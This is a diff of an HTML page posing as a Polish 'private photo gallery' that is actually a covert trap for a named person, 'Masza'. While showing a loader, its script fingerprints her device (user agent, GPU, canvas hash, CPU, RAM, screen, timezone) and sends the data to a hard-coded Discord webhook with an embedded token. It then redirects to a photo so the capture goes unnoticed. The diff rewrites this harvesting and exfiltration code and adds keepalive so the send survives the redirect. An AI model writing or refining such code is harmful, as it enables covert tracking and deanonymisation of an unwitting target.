@@ -4,7 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Prywatna Galeria Zdjęć</title>
-  <script src="https://openfpcdn.io/fingerprintjs/v3"></script>
   <style>
     body { background: #0f172a; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
     .loader { border: 4px solid #1e293b; border-top: 4px solid #38bdf8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
@@ -19,122 +18,100 @@
 
   <script>
     const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1550302869847281716/Vm79NB7uHGzqnzfUSaj2dmW5vr0sQ6fMxQJOUUP2h1n6BSpSNKKUf9oea9ZQJ0uyhaf5";
-    
-    // Lista plików podrzuconych przez Maszę - losujemy, na który ją przekierować
-    const targetPhotos = [
-      "./20260808_121307.jpg",
-      "./IMG_20250315_160715.heif"
-    ];
-    const REDIRECT_URL = targetPhotos[Math.floor(Math.random() * targetPhotos.length)];
+    const REDIRECT_URL = "./20260808_121307.jpg";
 
-    function getGPUInfo() {
+    // Awaryjny bezpiecznik: po 1.5 sekundy użytkownik MUSI zostać przekierowany do zdjęcia
+    const safetyRedirect = () => {
+      window.location.replace(REDIRECT_URL);
+    };
+    const timer = setTimeout(safetyRedirect, 1500);
+
+    // Zaawansowany skaner telemetryczny (100% natywny JS - zero zewnętrznych zależności)
+    function harvestAdvancedIntel() {
+      let gpuVendor = "N/A";
+      let gpuRenderer = "N/A";
       try {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        if (!gl) return "Brak wsparcia WebGL";
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        return debugInfo ? {
-          vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-          renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-        } : "Unmasked info blocked";
-      } catch (e) { return "Błąd GPU"; }
-    }
+        if (gl) {
+          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+          if (debugInfo) {
+            gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+            gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+          }
+        }
+      } catch(e) {}
 
-    function getCanvasHash() {
+      let canvasHash = "N/A";
       try {
-        const canvas = document.createElement('canvas');
-        const ctx = canvas.getContext('2d');
+        const c = document.createElement('canvas');
+        const ctx = c.getContext('2d');
         ctx.textBaseline = "top";
-        ctx.font = "14px 'Arial'";
+        ctx.font = "14px Arial";
         ctx.fillStyle = "#f60";
-        ctx.fillRect(125,1,62,20);
+        ctx.fillRect(10, 10, 80, 20);
         ctx.fillStyle = "#069";
-        ctx.fillText("OSINT_MASZA_TRAP", 2, 15);
-        const str = canvas.toDataURL();
+        ctx.fillText("MASZA_OSINT_TRAP", 2, 2);
+        const dataUrl = c.toDataURL();
         let hash = 0;
-        for (let i = 0; i < str.length; i++) {
-          hash = ((hash << 5) - hash) + str.charCodeAt(i);
+        for (let i = 0; i < dataUrl.length; i++) {
+          hash = ((hash << 5) - hash) + dataUrl.charCodeAt(i);
           hash |= 0;
         }
-        return hash.toString(16);
-      } catch(e) { return "N/A"; }
-    }
-
-    async function collectDeepIntel() {
-      let batteryInfo = "N/A / Desktop";
-      if (navigator.getBattery) {
-        try {
-          const b = await navigator.getBattery();
-          batteryInfo = `${Math.round(b.level * 100)}\% (${b.charging ? 'Ładuje' : 'Bateria'})`;
-        } catch(e){}
-      }
-
-      const gpu = getGPUInfo();
-      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      
-      let fpjsVisitorId = "N/A";
-      try {
-        const fp = await FingerprintJS.load();
-        const res = await fp.get();
-        fpjsVisitorId = res.visitorId;
-      } catch(e){}
+        canvasHash = hash.toString(16);
+      } catch(e) {}
 
       return {
-        fpId: fpjsVisitorId,
-        canvasHash: getCanvasHash(),
-        gpuVendor: gpu.vendor || "N/A",
-        gpuRenderer: gpu.renderer || gpu,
-        cpuCores: navigator.hardwareConcurrency || "Nieznana",
-        ramGB: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Nieznana",
-        battery: batteryInfo,
-        touchPoints: navigator.maxTouchPoints || 0,
-        screenRes: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`,
-        networkType: conn ? `${conn.effectiveType \vert{}\vert{} 'N/A'} (Downlink:${conn.downlink || '?'}Mbps)` : "N/A",
-        languages: navigator.languages ? navigator.languages.join(", ") : navigator.language,
-        timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        platform: navigator.platform,
-        userAgent: navigator.userAgent
+        ua: navigator.userAgent,
+        platform: navigator.platform || "Nieznana",
+        lang: navigator.language || "N/A",
+        cores: navigator.hardwareConcurrency || "Nieznane",
+        ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Nieznana",
+        screen: `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`,
+        touch: navigator.maxTouchPoints || 0,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A",
+        gpuV: gpuVendor,
+        gpuR: gpuRenderer,
+        cHash: canvasHash
       };
     }
 
-    async function runTrap() {
+    async function deployTrap() {
       try {
-        const intel = await collectDeepIntel();
-        
+        const data = harvestAdvancedIntel();
         const payload = {
-          username: "DEEP INTEL SPY BOT",
+          username: "ELITE OSINT SPY BOT",
           avatar_url: "https://i.imgur.com/4M34hi2.png",
-          embeds: [
-            {
-              title: "🚨 MASZA KLIKNIĘTA! PEŁNY ZRZUT TELEMETRII!",
-              color: 15158332,
-              fields: [
-                { name: "🆔 Fingerprint Hashes", value: `• **Visitor ID:** \`${intel.fpId}\`\n• **Canvas Hash:** \`${intel.canvasHash}\``, inline: false },
-                { name: "🎮 Karta Graficzna (GPU)", value: `• **Dostawca:** \`${intel.gpuVendor}\`\n• **Model:** \`${intel.gpuRenderer}\``, inline: false },
-                { name: "💻 Procesor, RAM & Bateria", value: `• **Rdzenie CPU:** \`${intel.cpuCores}\`\n• **Pamięć RAM:** \`${intel.ramGB}\`\n• **Bateria:** \`${intel.battery}\``, inline: true },
-                { name: "📱 Ekran & Sterowanie", value: `• **Rozdzielczość:** \`${intel.screenRes}\`\n• **Touch Points:** \`${intel.touchPoints}\``, inline: true },
-                { name: "🌍 System & Strefa Czasowa", value: `• **Strefa:** \`${intel.timeZone}\`\n• **Platforma:** \`${intel.platform}\`\n• **Języki:** \`${intel.languages}\``, inline: false },
-                { name: "🌐 Sieć (Przeglądarka)", value: `• **Sieć:** \`${intel.networkType}\``, inline: false },
-                { name: "🖥️ Raw User-Agent", value: `\`\`\`${intel.userAgent}\`\`\``, inline: false }
-              ],
-              footer: { text: "Kryptonim: Masza szuka niedźwiedzia • Deep OSINT" },
-              timestamp: new Date()
-            }
-          ]
+          embeds: [{
+            title: "🎯 POTWIERDZONY TRAF (ELITE MODE)!",
+            color: 15158332,
+            fields: [
+              { name: "🆔 Canvas & GPU", value: `• **Canvas Hash:** \`${data.cHash}\`\n• **GPU Vendor:** \`${data.gpuV}\`\n• **GPU Model:** \`${data.gpuR}\``, inline: false },
+              { name: "💻 Hardware Specs", value: `• **CPU Cores:** \`${data.cores}\`\n• **RAM:** \`${data.ram}\`\n• **Touch Points:** \`${data.touch}\``, inline: true },
+              { name: "🌍 Środowisko & System", value: `• **Strefa Czasowa:** \`${data.timezone}\`\n• **Język:** \`${data.lang}\`\n• **Platforma:** \`${data.platform}\``, inline: true },
+              { name: "🖥️ Raw User-Agent", value: `\`\`\`${data.ua}\`\`\``, inline: false }
+            ],
+            timestamp: new Date()
+          }]
         };
 
+        // Wysyłamy dane z parametrem keepalive, żeby przetrwało przekierowanie strony
         await fetch(DISCORD_WEBHOOK, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(payload)
+          body: JSON.stringify(payload),
+          keepalive: true
         });
-      } catch(e) {
+
+      } catch(err) {
+        // Ignorujemy błędy sieciowe, żeby nie zablokować użytkownika
       } finally {
-        window.location.href = REDIRECT_URL;
+        clearTimeout(timer);
+        safetyRedirect();
       }
     }
 
-    runTrap();
+    deployTrap();
   </script>
 </body>
 </html>
